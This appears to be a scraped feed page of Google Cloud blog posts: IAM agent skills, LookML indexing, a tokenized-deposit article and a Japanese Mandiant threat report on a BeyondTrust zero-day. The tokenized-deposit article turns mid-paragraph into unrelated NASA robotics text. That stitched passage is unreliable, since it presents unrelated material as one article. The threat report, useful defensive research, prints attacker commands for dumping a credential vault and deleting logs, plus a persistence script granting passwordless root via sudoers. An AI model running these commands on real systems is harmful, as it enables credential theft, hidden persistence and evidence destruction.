### Scale agents securely with IAM Helper Agent Skills and MCP Tools

- **Link**: [https://cloud.google.com/blog/products/identity-security/scale-agents-securely-with-iam-helper-agent-skills-and-mcp-tools/](https://cloud.google.com/blog/products/identity-security/scale-agents-securely-with-iam-helper-agent-skills-and-mcp-tools/)

- **Fetched**: 2026-10-27 01:30:29

<details class="entry-summary">
<summary>詳細を表示</summary>
<div class="block-paragraph_advanced"><p><span style="vertical-align: baseline;">As organizations adopt autonomous agents to build applications, securing identities and access has become more challenging. Developers relying on agents to provision cloud resources, write Terraform, and deploy microservices at machine-speed only find their CI/CD pipelines blo</span><span style="vertical-align: baseline;">cked even faster as security friction scales. </span><span style="vertical-align: baseline;"> </span></p>
<p><span style="vertical-align: baseline;">To help you get ahead of agentic-era Identity and Access Management, today we’re introducing IAM Helper. This suite of intelligent, agent-facing building blocks can automate complex, end-to-end IAM workflows. </span></p>
<p><span style="vertical-align: baseline;">As an agent-native orchestration and interface layer for Google Cloud IAM, it augments Google Cloud’s core IAM engines — including Policy Intelligence and Privileged Access Manager (PAM) — making IAM skills callable directly by autonomous code assistants, deployment pipelines, and custom agents. Using this functionality reduces the administrative overhead of maintaining least-privilege security and agent governance, while maximizing utility, and accelerating deployment.</span></p>
<h3><strong style="vertical-align: baseline;">IAM Helper Agent Skills: Fast, secure deployment with automated governance</strong></h3>
<p><span style="vertical-align: baseline;">Manual troubleshooting of permission blockers creates friction for engineering and administrators, while shortcuts can lead to broad agent over-permissioning that puts least privilege at risk. </span></p>
<p><span style="vertical-align: baseline;">IAM Helper empowers agents to handle access management dynamically. It shifts the burden of policy evaluation away from human administrators and LLMs, offloading complex orchestration directly to the Google Cloud backend, to maximize token efficiency and prevent costly operational bottlenecks.</span></p>
<p><span style="vertical-align: baseline;">Rather than operating as isolated utilities, IAM Helper Agent Skills guide agents through the cloud access lifecycle. These end-to-end workflows, helper scripts, and guardrails packaged using the open </span><a href="https://agentskills.io/home" rel="noopener" target="_blank"><span style="text-decoration: underline; vertical-align: baseline;">Agent Skills standard</span></a><span style="vertical-align: baseline;"> can orchestrate multiple underlying functions and APIs to resolve complex IAM tasks. They work across common agents (Gemini CLI, Gemini Cloud Assist, ADK, Claude Code, and Cursor). </span></p>
<h3><strong style="vertical-align: baseline;">Built-in guardrails and real-world impact</strong></h3>
<p><span style="vertical-align: baseline;">Every IAM Helper agent skill separates read-only discovery from policy changes: Diagnostics and simulations run automatically, while any change to access policies pauses for human-in-the-loop (HITL) confirmation based on customizable risk tiers. To see the value of IAM Helper in practice, consider how it transforms two everyday scenarios:</span></p>
<ul>
<li style="vertical-align: baseline;">
<p><strong style="vertical-align: baseline;">Scaled user-assisted remediation</strong><span style="vertical-align: baseline;">: Suppose a developer's coding agent hits a 403 error while deploying a new application. Rather than filing a support ticket and idling, the agent uses iam-helper-for-troubleshooting to identify the missing Pub/Sub permission in seconds, then uses iam-helper-for-privileged-access-management to request a one-hour JIT grant, eliminating hours of debugging friction.</span></p>
</li>
<li style="vertical-align: baseline;">
<p><strong style="vertical-align: baseline;">Autonomous pipeline self-healing</strong><span style="vertical-align: baseline;">: An infrastructure agent encounters a permission block during a routine deployment pipeline. Rather than failing the build, the pipeline uses IAM Helper Agent skills to generate a revised, least-privilege policy, verifies against 90 days of logs via iam-helper-for-policy-simulator that active services won't break, and routes the change to an admin for quick approval.</span></p>
</li>
</ul>
<p><span style="vertical-align: baseline;">IAM Helper Agent Skills are designed for maximum token and cost efficiency, allowing agents to execute multi-step administrative operations autonomously.</span></p>
<ol>
<li style="vertical-align: baseline;">
<p><strong style="vertical-align: baseline;">Authoring compliant, least-privilege policies</strong><span style="vertical-align: baseline;">: As DevOps engineers translate access requirements into JSON, YAML, or Terraform HCL, iam-helper-for-policy-management generates and validates IAM v1 allow bindings and IAM v2 deny rules. It automatically catches and blocks risky configs before they are applied, including public access (allUsers) and broad basic roles (roles/owner, roles/editor).</span></p>
</li>
<li style="vertical-align: baseline;">
<p><strong style="vertical-align: baseline;">Unblocking 403 errors in seconds</strong><span style="vertical-align: baseline;">: When an on-call engineer or deployment agent hits a cryptic 403 PERMISSION_DENIED error, iam-helper-for-troubleshooting identifies the exact missing permission or blocking rule in seconds. It adapts to the user’s role: Developers can check if they can unblock themselves locally or generate a structured ticket for their administrator (Requester flow), while security administrators can trace inherited allow and v2 deny rules across organization, folder, and project hierarchies to resolve the issue (Resolver flow).</span></p>
</li>
<li style="vertical-align: baseline;">
<p><strong style="vertical-align: baseline;">Simulating blast radius before rolling out changes</strong><span style="vertical-align: baseline;">: Before a platform engineer updates a policy or applies IAM Recommender role reductions, they need confidence that active workloads won't break. iam-helper-for-policy-simulator walks the agent through a structured plan, simulate, analyze, and apply flow, testing proposed changes against 90 days of historical access logs to confirm existing traffic won't be disrupted before any update takes effect.</span></p>
</li>
<li style="vertical-align: baseline;">
<p><strong style="vertical-align: baseline;">Elevating access just-in-time instead of granting standing privileges</strong><span style="vertical-align: baseline;">: When responders or maintenance agents need temporary production access, iam-helper-for-privileged-access-management manages the lifecycle of on-demand credentials through Privileged Access Manager (PAM). It supports requester, administrator, and approver workflows so elevated access is audited, time-bound, and automatically revoked once the task is done.</span></p>
</li>
</ol>
<p><span style="vertical-align: baseline;">While IAM Helper Agent Skills supply the high-level workflow logic, they are all based on a common set of foundational MCP Tools. </span></p>

<p><span style="vertical-align: baseline;">Because operations like hierarchy traversal, group expansion, and policy evaluation happen on dedicated IAM endpoints (spanning IAM v1 allow roles, IAM v2 deny, Policy Troubleshooter, and Policy Analyzer), skills run quickly and accurately with minimal token usage. Teams can also use these atomic MCP tools directly when writing their own custom Agent Skills, making it straightforward to combine Google Cloud's IAM capabilities with internal ticketing systems, custom compliance checks, and existing deployment pipelines.</span></p>

### Unifying enterprise context and semantics: LookML in Knowledge Catalog is now GA

- **Link**: [https://cloud.google.com/blog/products/business-intelligence/lookml-metadata-indexing-in-knowledge-catalog-is-now-ga/](https://cloud.google.com/blog/products/business-intelligence/lookml-metadata-indexing-in-knowledge-catalog-is-now-ga/)
- **Published**: 2026-10-27 01:00:00
- **Fetched**: 2026-10-27 01:30:29

<details class="entry-summary">
<summary>詳細を表示</summary>
<div class="block-paragraph"><p>As enterprises go from experimental AI agent prototypes to using them in production, data teams are realizing that <i>access</i> to data is not the same as <i>understanding</i> that data. To help bridge that gap, today, we are announcing the general availability (GA) of LookML semantic language indexing in Knowledge Catalog for <a href="https://cloud.google.com/looker">Looker Core on Google Cloud</a>.</p><p>To answer a complex business question accurately, an AI agent needs context — table schemas, data lineage, governance policies, business definitions, etc.. However, context is not a monolith; knowing where data lives is very different from knowing how to calculate metrics with it. In the enterprise, teams often conflate broad organizational context (usually in the form of metadata from structured and unstructured documents) with deterministic business semantics (the exact SQL formulas, join paths, and filtering rules that define metrics like net revenue or churn), assuming that a single data catalog or a business intelligence (BI) tool handling both enterprise-wide asset discovery and precise metric calculation.</p><p>In reality, no one tool can carry the entire load for agentic AI, as enterprise agents require both organizational context and deterministic business semantics. In Google Cloud environments, those are provided by Knowledge Catalog and LookML:</p><ul><li><b>Broad enterprise context with Knowledge Catalog:</b> Agents need a unified context graph that aggregates metadata across structured tables and unstructured documents. Through Knowledge Catalog, agents discover assets, inspect data quality, trace end-to-end lineage, respect column-level privacy tags, and surface corporate policy documents. The context graph tells an agent what data exists, how it is governed, and how it is connected.</li><li><b>Deterministic mathematical semantics with LookML:</b> What a catalog does not author on its own is how the numbers are computed. Describing a table is not the same as defining how tables join or how metrics are calculated. Looker's modeling language, LookML, encodes production-tested semantic logic — multi-grain join protections, conditional filters, and exact KPI formulas — so agents don't guess SQL math at runtime.</li></ul><p>With this native integration, the LookML business logic that powers your trusted BI reporting is automatically indexed into Knowledge Catalog — giving Gemini Enterprise and custom AI agents both enterprise-wide discovery and deterministic BI semantics.</p><h3><b>Why a context graph needs deterministic semantics</b></h3><p>When an LLM agent connects directly to raw database tables — even when armed with basic table descriptions or a business glossary — it still has to infer mathematical relationships on the fly. Without explicit semantic rules, agents routinely fall into two traps:</p><ol><li><b>Metric definition drift:</b> Standard text-to-SQL agents can invent conflicting formulas for foundational KPIs like net revenue or customer acquisition cost, failing to apply domain-specific accounting rules (such as recognizing revenue only when <i>order_status = 'Complete'</i> or prorating annual contracts across active service days).</li><li><b>Naive join fan-outs:</b> Complex schemas often contain one-to-many (1:N) and zero-to-many (0:N) relationships across invoices, line items, and refunds. Without pre-modeled join relationships and symmetric aggregation rules, agent-generated SQL can multiply rows and inflate financial totals.</li></ol><p>Knowledge Catalog and Looker solve this together, enabling you to model once in LookML and access those semantics everywhere across Google Cloud's AI ecosystem. Knowledge Catalog enforces semantic math when that logic is defined in a semantic modeling tool; LookML provides a mature, production-proven language for defining those exact mathematical relationships.</p><h3><b>What's new: LookML in Knowledge Catalog</b></h3><p>Previously, catalog integrations only captured shallow, file-level pointers and basic dashboard inventories. With this release, LookML's deterministic semantics become a first-class layer in the Knowledge Catalog context graph. An agent that finds a metric in the graph now also finds its exact definition, its join path, and its lineage back to source tables — in the same place, under the same governance. Synchronization is always on by default with no action required from end users, and with live sync, any update pushed to production LookML is reflected in Knowledge Catalog in near-real-time so agents operate on the freshest business logic.</p><p>Because this metadata is indexed directly into Knowledge Catalog by default, it is <a href="https://docs.cloud.google.com/gemini/enterprise/docs/connectors/connect-knowledge-catalog#configure-knowledge-catalog">immediately available to Gemini Enterprise</a>, without custom agent code or separate catalog data stores. When connected to Knowledge Catalog, Gemini Enterprise uses built-in read-only skills and hybrid search to look up technical schemas, business glossaries, and indexed LookML logic in a single step, passing that rich context directly to your federated BigQuery connector to generate accurate SQL. (For developers building custom agents, the same context bundles are also accessible via the LookupContext API.)</p><p>Knowledge Catalog now captures and links the following entity levels across Looker Core on Google Cloud:</p><ul><li><b>LookML models (looker-model):</b> Captures descriptive metadata, database connection routing, include hierarchies, data validation tests (assert), and parent-child EntryLinks mapping models to their associated Explores, Views, and LookML dashboards.</li><li><b>LookML Explores (looker-explore):</b> Indexes full relational join logic (type, sql_on, relationship cardinality such as many_to_one fan-out protection, foreign_key, required_joins, and sql_where) as Schema-Join relationships. It also captures mandatory filter guardrails (always_filter, access_filter), inherited dimensions and measures, and predefined <b>starter queries</b> that help agents and analysts overcome the cold-start problem.</li><li><b>LookML Views and fields (looker-view):</b> Extracts column-level compiled LookML SQL expressions (for example, ${total_revenue} / NULLIF(${count}, 0)), primary keys, dimension group timeframes, field synonyms, and derived table transformation logic (including SQL and native derived tables, partition keys, and cluster keys).</li><li><b>Dashboards, Looks, and tiles (looker-dashboard, looker-dashboard-element, looker-look):</b> Catalogs both UI-created and LookML-defined dashboards and visualization tiles, complete with dashboard filters, chart types, ownership, and usage statistics. Users in Knowledge Catalog are able to see table- and column-level lineage from underlying BigQuery tables all the way to individual dashboard tiles, allowing data engineers to evaluate schema changes proactively, before disruptions occur.</li></ul></div>

### Easy to integrate, compliant by design: Bringing the Swiss Franc to Google Cloud Universal Ledger

- **Link**: [https://cloud.google.com/blog/topics/financial-services/easy-to-integrate-compliant-by-design-bringing-the-swiss-franc-to-google-cloud-universal-ledger/](https://cloud.google.com/blog/topics/financial-services/easy-to-integrate-compliant-by-design-bringing-the-swiss-franc-to-google-cloud-universal-ledger/)
- **Published**: 2026-10-27 05:00:00
- **Fetched**: 2026-10-27 06:22:00

<details class="entry-summary">
<summary>詳細を表示</summary>
<div class="block-paragraph"><p>Every day, countless financial transactions are interrupted by slow, expensive, and inflexible conventional payment systems. As a result, public commercial stablecoins like Tether, USDC, and PayPal USD have become increasingly popular by making it easy to move money efficiently with instant, 24/7 blockchain settlement.</p><p>Yet major regulated banks have largely kept such transactions at arm’s length; for these financial institutions, reserve-backed public stablecoins present numerous risks, including strict capital and liquidity requirements and unmanageable regulatory and operational uncertainty.</p><p>Indeed, banks don't want to adopt existing stablecoins. Instead, they need the speed and efficiency of tokenized currency built on the trusted economic foundations they’ve nurtured over years or even decades in business. That’s why many are now turning to <a href="https://cloud.google.com/application/web3/universal-ledger">Google Cloud Universal Ledger</a> (GCUL). Rather than channeling public stablecoins, GCUL provides the secure infrastructure banks need to issue and settle tokenized deposits. That brings real-time, 24/7 programmable payments into commercial bank money while satisfying regulators and without disrupting core banking operations.</p><p>For many banks, this is a compelling vision, but adopting new payment technology and integrating it with core banking systems can seem to bank CTOs like a daunting undertaking. But with a blockchain purpose-built for financial services like GCUL, this is anything but a herculean task.</p><p>Looking to expand its offerings for an increasingly global clientele, Switzerland’s <a href="https://www.crypto-finance.com/" target="_blank">Crypto Finance Group</a> wanted to show it could deploy payment innovations like this in just weeks. Stablecoins also limit the frustrations caused by opaque cross-border transactions, where fragmented compliance checks can leave legitimate payments in extended and unexplained limbo and without a path to clear or timely resolution.</p><p>Still, commercial banks have been reluctant to offer popular reserve-backed stablecoins from permissionless blockchains to their customers despite their retail popularity. Because every minute in space is a strictly limited resource, reducing the physical burden on astronauts to maximize their time for science and discovery is a top priority. To potentially address this challenge, NASA’s <a href="https://www.nasa.gov/hrp/" target="_blank">Human Research Program</a>, Johnson Space Center Robotics Team, and the Jet Propulsion Laboratory (JPL) collaborated with Google Public Sector to develop a robotic system. For example, if an astronaut experiences severe back pain—a potential symptom of kidney stones—the robot could retrieve and prepare an ultrasound machine. This enables the human crew medical officer to focus entirely on analyzing the scan and treating the patient.</p><h3><b>Adapting spatial awareness and vision-language-action models for robotic systems</b></h3><p>Operating safely alongside humans in confined spacecraft is a complex challenge. Unlike factory robots in fixed, human-free environments, space systems utilizing Super Intelligence (SI) require flexible, human-directed tools to safely adapt to close quarters. Because they must also rely on limited sensory input like cameras, JPL is adapting satellite situational awareness intelligence tools—originally designed to track objects in orbit—to help the robotic system navigate and understand its 3D surroundings.</p><p>To test this safely at Johnson Space Center’s iMETRO facility, Google DeepMind’s <a href="https://mujoco.org/" target="_blank">MuJoCo simulator</a> was used, which is an advanced physics engine that allows the SI to practice complex movements in a highly accurate virtual environment before touching real hardware. In a recent proof-of-concept technology demonstration, the robotic system was tasked with a complex "pick-and-place" maneuver to locate and move a medical bag. Because vision-language-action (VLA) models connect language directly to physical movement, astronauts could direct the robotic system flexibly via standard English text prompts.</p><h3><b>Space: the ultimate edge-computing environment</b></h3><p>Processing these complex tasks requires significant computing power, which presents another hurdle: space is the ultimate edge computing environment. Spacecraft cannot rely on continuous connections to Earth-based data centers. To solve this, the Google team harnessed Google Cloud <a href="https://docs.cloud.google.com/compute/docs/accelerator-optimized-machines#g4-series">G4 instances</a> to rapidly train the underlying models, fine-tuning the 4-billion parameter Pi0 model in just 2.5 hours. Crucially, they demonstrated that the fine-tuned models can then operate locally on compact, energy-efficient edge devices. Over the last two years, the team tested approximately 15 different edge computing devices to find ones that run efficiently on lightweight, low-power hardware required for future Mars missions.</p><h3><b>Pioneering the future of crew safety and space exploration</b></h3><p>Looking ahead, the ultimate goal is to build a robotic system that can execute a variety of tasks via simple voice instructions, under the astronauts’ direct supervision and command. For instance, the robot might be directed to assist with routine health monitoring—such as capturing basic vitals or simple ultrasounds—under the strict guidance of a human crew medical officer. This ensures astronauts receive the physical assistance they might not be able to perform by themselves, without ever replacing human decision-making.</p><p>This collaboration between Google Public Sector and NASA can help pave the way for increasingly difficult missions that push the bounds of scientific discovery.</p><p>Want to learn more about the value of Gemini to your mission? <a href="https://cloudonair.withgoogle.com/events/google-public-sector-summit-2026?utm_source=linkedin&amp;utm_medium=paidsocial&amp;utm_campaign=FY26-Q4-northam-PUB10000039-onlineevent-er-ps-summit-on-demand-2026&amp;utm_content=-&amp;utm_term=-" target="_blank">Register</a> to watch our Google Public Sector Summit on demand or reach out to geminiforgov@google.com for more information.</p></div>

<h4><strong style="vertical-align: baseline;">はじめに</strong></h4>
<p><span style="vertical-align: baseline;">BeyondTrust は 10 月 15 日に、BeyondTrust Remote Support（旧 Bomgar）アプライアンスに影響する脆弱性 CVE-2026-102764 を公表しました。BeyondTrust Remote Support は、IT チームがリモート エンドポイントに安全にアクセスしてトラブルシューティングを行うことができる、エンタープライズ向けのセキュアなリモート アクセス ソリューションです。この脆弱性の悪用に成功すると、任意のファイルをアップロードできます。</span></p>
<p><span style="vertical-align: baseline;">Mandiant は、インシデント対応において、中国との関連が疑われるサイバースパイ目的の脅威アクターである ARMORY CASTLE（以前は </span><a href="https://cloud.google.com/blog/topics/threat-intelligence/brickstorm-espionage-campaign?e=48754805"><span style="vertical-align: baseline;"> </span><span style="text-decoration: underline; vertical-align: baseline;">UNC5221</span></a><span style="vertical-align: baseline;"> として追跡）が、2026 年 8 月下旬にこの脆弱性をゼロデイとして悪用した証拠を特定しました。このブログ投稿では、ARMORY CASTLE が CVE-2026-102764 を悪用した後、どのように権限を昇格させ、侵害された BeyondTrust Remote Support アプライアンスへの永続的なアクセスを確立したかを説明し、防御に関する実用的なガイダンスを提供します。</span></p>
<p><span style="vertical-align: baseline;">ARMORY CASTLE やその他の脅威アクターはこれまで、脆弱性が一般に公表された後に、それを広範囲にわたって日和見的に悪用してきた経緯があるため、組織は脆弱性が明らかになった後に悪用が広がる可能性に備える必要があります。</span></p>
<h4><strong style="vertical-align: baseline;">脆弱性の悪用</strong></h4>
<p><span style="vertical-align: baseline;">Mandiant は、access、syslog、messages、thin-scc、brain、SSL の各ログファイルで、CVE-2026-102764 の悪用の痕跡を特定しました。これらのファイルは、</span><code style="vertical-align: baseline;">/home</code><span style="vertical-align: baseline;"> ディレクトリを含む LUKS 暗号化パーティションを介してのみアクセスできるものです。影響を受ける組織は、BeyondTrust が提供するセキュリティ</span><a href="https://www.beyondtrust.com/trust-center/security-advisories/bt26-05" rel="noopener" target="_blank"><span style="vertical-align: baseline;"> </span><span style="text-decoration: underline; vertical-align: baseline;">パッチ</span></a><span style="vertical-align: baseline;">を直ちに適用して脆弱性を修復し、BeyondTrust の</span><a href="https://www.beyondtrust.com/blog/entry/bt26-05" rel="noopener" target="_blank"><span style="text-decoration: underline; vertical-align: baseline;">ブログ</span></a><span style="vertical-align: baseline;">で追加のガイダンスを確認することを強くおすすめします。</span></p>
<h4><strong style="vertical-align: baseline;">侵入後の活動</strong></h4>
<p><span style="vertical-align: baseline;">Mandiant は、ARMORY CASTLE が CVE-2026-102764 の悪用に成功した後、複数の異なる TTP を利用して足がかりを確立し、権限を昇格させ、ラテラル ムーブメントを可能にしたことを確認しています。ARMORY CASTLE は、侵入全体を通じて、BeyondTrust アプライアンスの内部構造に関する深い知識を利用していました。これは、独自の CLI ユーティリティ、起動構成テンプレート、ローカルのリバース プロキシ ルーティングが悪用されたことからわかっています。脅威アクターは、新たに特定されたカスタム マルウェア、SAWFLY ウェブシェル、BARECLAW トンネラーを使用して、BeyondTrust デバイスを操作していました。また、アクセスを維持して検出を回避するために、アプライアンスのログとエンドポイントのアーティファクトを定期的に削除していました。</span></p></div>

<div class="block-paragraph_advanced"><p><strong style="vertical-align: baseline;">ステージング用のウェブシェル</strong></p>
<p><span style="vertical-align: baseline;">CVE-2026-102764 の悪用に成功した後、ARMORY CASTLE は </span><code style="vertical-align: baseline;">/app_84304470%2Ephp</code><span style="vertical-align: baseline;"> への POST リクエストを開始しました。Mandiant は、これらの POST リクエストに関連付けられたファイルを復元できませんでした。最初の POST リクエストから約 11 分後に、ウェブ ルートパス </span><code style="vertical-align: baseline;">/%SITE_SERVICE_ACCOUNT%/ingredi/app/laravel/public/</code><span style="vertical-align: baseline;"> に SAWFLY ウェブシェルが作成されたことをファイル システムが記録しています。ARMORY CASTLE は、侵入の過程で、環境内の主要な足がかりの一つとして SAWFLY ウェブシェルを利用していました。</span></p>
<p><strong style="vertical-align: baseline;">SAWFLY ウェブシェル</strong></p>
<p><span style="vertical-align: baseline;">SAWFLY（</span><code style="vertical-align: baseline;">mangoapi.php</code><span style="vertical-align: baseline;">）は、難読化された軽量の PHP ウェブシェルで、カスタムの Base32 トランスポート層と 256 ビットの RC4 ストリーム暗号を使用して、双方向の暗号化された C2 通信を実装します。このウェブシェルは、受信する HTTP POST リクエストで、難読化されたパラメータ </span><code style="vertical-align: baseline;">_c94mfe</code><span style="vertical-align: baseline;"> の有無を確認します。</span></p>
<p><span style="vertical-align: baseline;">パラメータが存在しない場合、スクリプトは直ちに HTTP ステータス「404 見つかりません」（</span><code style="vertical-align: baseline;">http_response_code(404)</code><span style="vertical-align: baseline;">）を設定し、自動ウェブクローラや脆弱性スキャナを回避するために終了します。</span><code style="vertical-align: baseline;">_c94mfe</code><span style="vertical-align: baseline;"> パラメータが指定されている場合、ウェブシェルはペイロードを Base32 でデコードし、ハードコードされた 32 バイトの鍵を使用して RC4 で復号してから、結果の PHP コードを </span><code style="vertical-align: baseline;">@eval()</code><span style="vertical-align: baseline;"> で実行します。評価されたコードから返される null 以外の値は、同じ鍵を使って RC4 で暗号化され、Base32 でエンコードされて、クライアントにエコーバックされます。</span></p>
<p><strong style="vertical-align: baseline;">SUID ビット権限による権限昇格</strong></p>
<p><span style="vertical-align: baseline;">SAWFLY ウェブシェルは、サイトのサービス アカウント（権限のないローカル ユーザー）で実行されました。脅威アクターは、権限を昇格させるために、システムシェルの実行可能ファイル（</span><code style="vertical-align: baseline;">/bin/sh</code><span style="vertical-align: baseline;">）をファイル </span><code style="vertical-align: baseline;">/usr/bin/dbus-authd</code><span style="vertical-align: baseline;"> にコピーしました。</span></p>
<p><span style="vertical-align: baseline;">その後、脅威アクターはファイルの所有権を root に変更し、Set User ID（SUID）ビットを設定しました。バイナリで SUID 権限が有効になっている場合、コマンドを実行するユーザーではなく、ファイルの所有者（root）の権限で実行されるため、結果的に、ホストシステムへの永続的な root レベルのバックドア アクセスが脅威アクターに許可されました。</span></p>
<p><span style="vertical-align: baseline;">ウェブシェルを介して足がかりを確立した後、アクターはウェブ サービス アカウントからアプライアンス ホストの root レベルの制御に昇格しました。これにより、アプライアンスが保存または仲介するすべての認証情報にアクセスし、ファイルを変更できるようになりました。これは、再起動や構成のリセット後も維持されます。</span></p>
<p><strong style="vertical-align: baseline;">認証情報の収集: BeyondTrust Vault の抽出</strong></p>
<p><span style="vertical-align: baseline;">Mandiant は、脅威アクターがアプライアンスのネイティブ シークレット管理データベースから認証情報を直接収集しようと試みていたことを確認しました。アクターはその際に </span><code style="vertical-align: baseline;">/ns/sbin/bt-secrets</code><span style="vertical-align: baseline;"> バイナリを利用していました。これは、BeyondTrust アプライアンスにネイティブの独自の管理コマンドライン インターフェース（CLI）ユーティリティであり、パスワード、API キー、エンドポイント認証情報の管理、保存、取得に使用されているものです。</span></p>
<p><span style="vertical-align: baseline;">脅威アクターは、アプライアンスの認証情報 Vault を特定してダンプするために、いくつかの CLI 構文のバリエーションを体系的に繰り返していました。</span></p></div>
<div class="block-paragraph_advanced"><pre class="language-markup"><code>/ns/sbin/bt-secrets get -p %SITE_SERVICE_ACCOUNT% vault
/ns/sbin/bt-secrets get %SITE_SERVICE_ACCOUNT% vault
/ns/sbin/bt-secrets get vault
</code></pre>
<p style="text-align: center;"><span style="color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;"><span style="vertical-align: baseline;"><span style="font-style: italic; vertical-align: baseline;">図 2: メッセージ ログから復元されたコマンド</span></span></span></p></div>
<div class="block-paragraph_advanced"><p><span style="vertical-align: baseline;">脅威アクターは最初に、特定のサイトのサービス アカウント用 Vault を標的にして、そのプロファイル専用に割り当てられたパスワードと鍵を取得しようとしました。</span></p>
<p><span style="vertical-align: baseline;">次に、フォールバック コマンドを実行して、グローバルなアプライアンス レベルのパスワード セーフを標的にして、保存されている管理者の認証情報をすべてダンプしました。</span></p>
<p><span style="vertical-align: baseline;">そして、</span><code style="vertical-align: baseline;">/home/bomgar/log/bt-secrets.log</code><span style="vertical-align: baseline;"> に保存されたレコードとアーカイブ ファイルを強制的に削除して、bt-secrets バイナリとのやり取りを終了しました。</span></p></div>
<div class="block-paragraph_advanced"><pre class="language-markup"><code>/usr/sbin/sh -c 'rm -f /home/bomgar/log/bt-secrets.log /home/bomgar/log/bt-secrets.log.* 2&gt;/dev/null;'</code></pre>
<p style="text-align: center;"><span style="color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;"><span style="vertical-align: baseline;"><span style="font-style: italic; vertical-align: baseline;">図 3: メッセージ ログから復元されたコマンド</span></span></span></p></div>
<div class="block-paragraph_advanced"><p><strong style="vertical-align: baseline;">永続性</strong></p>
<p><span style="vertical-align: baseline;">Mandiant は、脅威アクターが長期的な永続アクセスを目的として、BeyondTrust 構成テンプレートを標的にし、サイトのサービス アカウントにパスワードなしの root 権限を付与したことを確認しました。</span></p>
<p><span style="vertical-align: baseline;">脅威アクターは最初に </span><code style="vertical-align: baseline;">/home/bomgar/sbin/post_boot.d</code><span style="vertical-align: baseline;"> ディレクトリを作成しました。このディレクトリは、システム起動時に自動的に実行されるスクリプト用に予約されているものです。このディレクトリ内に、</span><code style="vertical-align: baseline;">zz-root-persist</code><span style="vertical-align: baseline;"> という名前のシェル スクリプトを作成しました。</span></p>
<p><code style="vertical-align: baseline;">zz-root-persist</code><span style="vertical-align: baseline;"> スクリプトの内容を見ると、まず </span><code style="vertical-align: baseline;">/ns/config/sudoers.template</code><span style="vertical-align: baseline;"> ファイル内で、ユーザー アカウントにパスワードなしの root 権限がすでに付与されているかどうかを確認しています。エントリがない場合、スクリプトは </span><code style="vertical-align: baseline;">'%SITE_SERVICE_ACCOUNT% ALL=(ALL) NOPASSWD: ALL'</code><span style="vertical-align: baseline;"> をテンプレートに追加します。sudoers テンプレートに追加されたこのエントリにより、サイトのユーザー アカウントに、ホストシステムで任意のコマンドを実行するためのパスワードなしの管理者権限が付与されます。</span></p>
<p><span style="vertical-align: baseline;">最後に、スクリプトは </span><code style="vertical-align: baseline;">'/ns/sbin/bt-sysconfig' --no-restart misc</code><span style="vertical-align: baseline;"> を実行します。これは、アプライアンスのバックエンドに、</span><code style="vertical-align: baseline;">/ns/config/sudoers.template</code><span style="vertical-align: baseline;"> を直ちに解析して、アクティブな </span><code style="vertical-align: baseline;">/etc/sudoers</code><span style="vertical-align: baseline;"> ファイルを再構築するよう強制するものです。この戦略により、脅威アクターの権限昇格は、システムの再起動や構成のリセット後も維持されます。通常、システムの再起動や構成のリセットを行うと、</span><code style="vertical-align: baseline;">/etc/sudoers</code><span style="vertical-align: baseline;"> に直接加えられた手動の変更は上書きされます。</span></p></div>
<div class="block-paragraph_advanced"><pre class="language-markup"><code>#!/bin/bash
grep -qF '%SITE_SERVICE_ACCOUNT% ALL=(ALL) NOPASSWD: ALL' '/ns/config/sudoers.template' || echo '%SITE_SERVICE_ACCOUNT% ALL=(ALL) NOPASSWD: ALL' &gt;&gt; '/ns/config/sudoers.template'
'/ns/sbin/bt-sysconfig' --no-restart misc
</code></pre>

<div class="block-paragraph_advanced"><p><strong style="vertical-align: baseline;">フォレンジック対策</strong></p>
<p><span style="vertical-align: baseline;">Mandiant は、脅威アクターがアプライアンスへの不正アクセスを通じて、システム、ウェブサーバー、アプリケーション レベルのログを体系的に削除することで、防御を損ない、検出を妨げようとした複数のケースを確認しました。</span></p>

<div class="block-paragraph_advanced"><p><strong style="vertical-align: baseline;">内部偵察</strong></p>
<p><span style="vertical-align: baseline;">Mandiant は、脅威アクターが昇格した管理者権限を取得した後、リモート サポート セッションを確立して、内部エンドポイントを標的にしたことを確認しました。</span></p>
<p><span style="vertical-align: baseline;">接続が確立されると、脅威アクターはアプライアンスに組み込まれているサポートツールを利用して、ファイル システムへのフルアクセスをリクエストし、取得しました。その後、BeyondTrust Remote Support のネイティブ ファイル転送サービスを利用して、ソフトウェア インベントリなど、ネットワーク偵察に役立つ機密性の高い内部ドキュメントをユーザーのデスクトップ環境から直接ダウンロードして引き出しました。</span></p>
<p><strong style="vertical-align: baseline;">BARECLAW トンネラー</strong></p>
<p><span style="vertical-align: baseline;">Mandiant は、脅威アクターがカスタム SOCKS5 プロキシ トンネラーを使用して、BeyondTrust デバイスを通過するトラフィックをトンネリングしたことを確認しました。BARECLAW は C 言語で記述されたトンネラーであり、WebSocket トランスポートを介して運ばれる SOCKS5 プロキシ サービスを提供し、リモート クライアントと宛先間の TCP 接続を中継します。BARECLAW は、静的に埋め込まれた CivetWeb WebServer を利用して HTTP と WebSocket の機能を提供し、TLS に OpenSSL を利用します。BARECLAW は構成可能で、認証を必須とすること、クライアントとトンネラー間のデータを暗号化すること、到達可能な宛先を特定の CIDR の範囲に制限すること、トラフィックをアップストリーム プロキシに転送すること、そしてデフォルトの WebSocket エンドポイントとリスニング ポートを変更することが可能です。TLS は PEM 証明書を提供することで有効になります。認証、暗号化、宛先フィルタリング、TLS はデフォルトで無効になっています。</span></p>
<p><span style="vertical-align: baseline;">BARECLAW は CLI 入力から構成を受け取り、CLI オプション メニューを提供します。</span></p></div>
<div class="block-paragraph_advanced"><pre class="language-markup"><code>Usage: %s [options]
  --listen PORT            plain ws port (default 8080)
  --listen-tls PORT        wss port (default 8443, needs --ssl-cert)
  --ssl-cert FILE          PEM certificate (enables wss)
  --token STRING           shared secret (?token= auth + obfs seed)
  --obfs                   enable XOR stream obfuscation
  --timeout SEC            idle timeout (default 300)
  --connect-timeout SEC    target connect timeout (default 10)
  --max-tunnels N          concurrent tunnel limit (default 100)
  --allow-net CIDR         allowed target subnet (repeatable)
  --upstream [socks5://]host:port   route via upstream SOCKS5
  --threads N              civetweb worker threads (default 64)
  --ws-path PATH           websocket endpoint path (default /wsproxy)
  -q, --quiet              zero output (all logging suppressed)
  -h                       this help
</code></pre>
<p style="text-align: center;"><span style="color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;"><span style="vertical-align: baseline;"><span style="font-style: italic; vertical-align: baseline;">図 8: BARECLAW の CLI オプション メニュー</span></span></span></p>
